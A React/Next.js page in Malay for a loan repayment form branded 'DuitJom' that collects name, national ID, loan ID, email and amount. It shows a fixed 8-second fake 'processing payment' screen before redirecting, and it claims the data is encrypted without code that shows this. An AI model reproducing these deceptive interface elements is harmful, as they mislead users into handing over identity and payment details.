'use client'

import { useEffect, useRef, useState } from 'react'
import { useRouter } from 'next/navigation'
import Image from 'next/image'
import Link from 'next/link'
import {
  AlertTriangle,
  ArrowLeft,
  CreditCard,
  Loader2,
  ShieldCheck,
} from 'lucide-react'
import {
  emptyCustomer,
  getCustomer,
  saveCustomer,
  type CustomerData,
} from '@/lib/payment-session'

export default function BorangPage() {
  const router = useRouter()
  const [form, setForm] = useState<CustomerData>(emptyCustomer())
  const [agree, setAgree] = useState(false)
  const [warn, setWarn] = useState(false)
  const [loading, setLoading] = useState(false)
  const warnRef = useRef<HTMLDivElement>(null)

  useEffect(() => {
    const existing = getCustomer()
    if (existing) {
      setForm((prev) => ({ ...prev, ...existing }))
    }
  }, [])

  const update =
    (key: keyof CustomerData) =>
    (e: React.ChangeEvent<HTMLInputElement>) =>
      setForm((prev) => ({ ...prev, [key]: e.target.value }))

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()

    if (!agree) {
      setWarn(true)
      // vibrate on mobile devices
      if (typeof navigator !== 'undefined' && 'vibrate' in navigator) {
        navigator.vibrate([120, 60, 120])
      }
      warnRef.current?.scrollIntoView({ behavior: 'smooth', block: 'center' })
      return
    }

    setWarn(false)
    saveCustomer(form)
    setLoading(true)

    // 8 second loading screen, then redirect to payment page
    setTimeout(() => {
      router.push('/bayaran')
    }, 8000)
  }

  if (loading) {
    return <ProcessingScreen />
  }

  return (
    <main className="relative min-h-screen bg-navy pb-16">
      <div className="pointer-events-none absolute -left-20 top-10 h-72 w-72 rounded-full bg-navy-light/50 blur-3xl" />
      <div className="pointer-events-none absolute right-0 top-40 h-80 w-80 rounded-full bg-orange/10 blur-3xl" />

      <header className="relative z-10 mx-auto flex w-full max-w-3xl items-center justify-between px-4 py-5 sm:px-6">
        <Link href="/" className="flex items-center" aria-label="DuitJom">
          <Image
            src="/duitjom-logo.png"
            alt="DuitJom"
            width={132}
            height={42}
            priority
            className="h-9 w-auto brightness-0 invert"
          />
        </Link>
        <Link
          href="/login"
          className="flex items-center gap-2 text-sm font-semibold text-white/80 transition-colors hover:text-orange"
        >
          <ArrowLeft className="h-4 w-4" />
          Log Keluar
        </Link>
      </header>

      <div className="relative z-10 mx-auto w-full max-w-3xl px-4 sm:px-6">
        <div className="rounded-3xl bg-card p-6 shadow-2xl shadow-black/30 ring-1 ring-black/5 sm:p-9">
          <div className="flex items-center gap-3">
            <span className="flex h-12 w-12 items-center justify-center rounded-xl bg-navy text-orange">
              <CreditCard className="h-6 w-6" />
            </span>
            <div>
              <h1 className="text-2xl font-extrabold text-foreground">
                Butiran Bayaran
              </h1>
              <p className="text-sm text-muted-foreground">
                Sila lengkapkan maklumat bayaran balik anda
              </p>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="mt-8 grid gap-5">
            <Field
              label="Nama Penuh"
              placeholder="Nama seperti dalam kad pengenalan"
              value={form.nama}
              onChange={update('nama')}
              required
            />
            <Field
              label="Nombor Pengenalan"
              placeholder="Contoh: 900101-01-1234"
              value={form.pengenalan}
              onChange={update('pengenalan')}
              required
            />
            <Field
              label="APP / ID Loan"
              placeholder="ID pinjaman anda"
              value={form.appId}
              onChange={update('appId')}
              required
            />

            <div>
              <label className="text-xs font-semibold tracking-wide text-muted-foreground">
                NOMBOR TELEFON
              </label>
              <div className="mt-2 flex items-center gap-2 rounded-xl bg-secondary px-4 py-3.5 text-sm font-semibold text-foreground ring-1 ring-border">
                {form.phone || 'Tiada nombor'}
                <span className="ml-auto rounded-full bg-green/10 px-2 py-0.5 text-[10px] font-bold text-green-dark">
                  DARI LOG MASUK
                </span>
              </div>
            </div>

            <Field
              label="Email"
              type="email"
              placeholder="nama@email.com"
              value={form.email}
              onChange={update('email')}
              required
            />
            <Field
              label="Jumlah Bayaran (RM)"
              type="text"
              inputMode="decimal"
              placeholder="Contoh: 500.00"
              value={form.jumlah}
              onChange={(e) =>
                setForm((prev) => ({
                  ...prev,
                  jumlah: e.target.value.replace(/[^0-9.]/g, ''),
                }))
              }
              required
            />

            {/* Agreement */}
            <div
              ref={warnRef}
              className={`rounded-xl border p-4 transition-colors ${
                warn
                  ? 'border-destructive bg-destructive/5'
                  : 'border-border bg-secondary'
              }`}
            >
              <label className="flex cursor-pointer items-start gap-3">
                <input
                  type="checkbox"
                  checked={agree}
                  onChange={(e) => {
                    setAgree(e.target.checked)
                    if (e.target.checked) setWarn(false)
                  }}
                  className="mt-0.5 h-5 w-5 shrink-0 cursor-pointer accent-orange"
                />
                <span className="text-sm leading-relaxed text-foreground">
                  Saya mengesahkan bahawa semua maklumat yang diberikan adalah
                  betul dan tepat.
                </span>
              </label>

              {warn && (
                <div className="mt-3 flex items-center gap-2 text-sm font-semibold text-destructive">
                  <AlertTriangle className="h-4 w-4 shrink-0" />
                  Sila tandakan kotak pengesahan sebelum meneruskan.
                </div>
              )}
            </div>

            <button
              type="submit"
              className="mt-1 flex w-full items-center justify-center gap-2 rounded-xl bg-green py-4 text-sm font-bold text-white shadow-lg shadow-green/25 transition-colors hover:bg-green-dark"
            >
              BAYAR SEKARANG
            </button>

            <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground">
              <ShieldCheck className="h-4 w-4 text-green" />
              Maklumat anda disulitkan dan dilindungi
            </div>
          </form>
        </div>
      </div>
    </main>
  )
}

function Field({
  label,
  ...props
}: { label: string } & React.InputHTMLAttributes<HTMLInputElement>) {
  const id = label.toLowerCase().replace(/[^a-z0-9]+/g, '-')
  return (
    <div>
      <label
        htmlFor={id}
        className="text-xs font-semibold tracking-wide text-muted-foreground"
      >
        {label.toUpperCase()}
      </label>
      <input
        id={id}
        {...props}
        className="mt-2 w-full rounded-xl px-4 py-3.5 text-sm text-foreground outline-none ring-1 ring-border transition-shadow placeholder:text-muted-foreground focus:ring-2 focus:ring-orange"
      />
    </div>
  )
}

function ProcessingScreen() {
  return (
    <main className="relative flex min-h-screen flex-col items-center justify-center overflow-hidden bg-navy px-6 text-center">
      <div className="pointer-events-none absolute -left-20 top-10 h-72 w-72 rounded-full bg-navy-light/50 blur-3xl" />
      <div className="pointer-events-none absolute right-0 top-40 h-80 w-80 rounded-full bg-orange/10 blur-3xl" />

      <div className="relative z-10 flex flex-col items-center">
        <Image
          src="/duitjom-logo.png"
          alt="DuitJom"
          width={160}
          height={52}
          priority
          className="h-11 w-auto brightness-0 invert"
        />
        <Loader2 className="mt-10 h-14 w-14 animate-spin text-orange" />
        <h1 className="mt-8 text-2xl font-extrabold text-white">
          Memproses Bayaran Anda
        </h1>
        <p className="mt-3 max-w-sm text-pretty leading-relaxed text-white/70">
          Sila tunggu sebentar. Kami sedang menyediakan halaman bayaran yang
          selamat untuk anda.
        </p>
        <div className="mt-6 h-1.5 w-56 overflow-hidden rounded-full bg-white/10">
          <div className="h-full w-full origin-left animate-pulse rounded-full bg-orange" />
        </div>
      </div>
    </main>
  )
}
